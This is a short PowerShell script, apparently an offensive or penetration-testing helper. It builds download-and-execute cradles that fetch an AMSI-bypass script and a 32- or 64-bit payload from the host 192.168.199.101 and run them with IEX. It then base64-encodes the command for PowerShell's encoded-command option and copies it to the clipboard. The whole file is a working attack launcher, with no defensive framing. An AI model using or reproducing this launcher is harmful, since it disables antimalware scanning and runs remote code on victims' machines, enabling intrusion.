$command = "(New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/amsibypass.ps1') | IEX; (New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/runme32.ps1') | IEX"
$command = "(New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/amsibypass.ps1') | IEX; (New-Object System.Net.WebClient).DownloadString('http://192.168.199.101/runme64.ps1') | IEX"

$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))

$Encoded

$Encoded | clip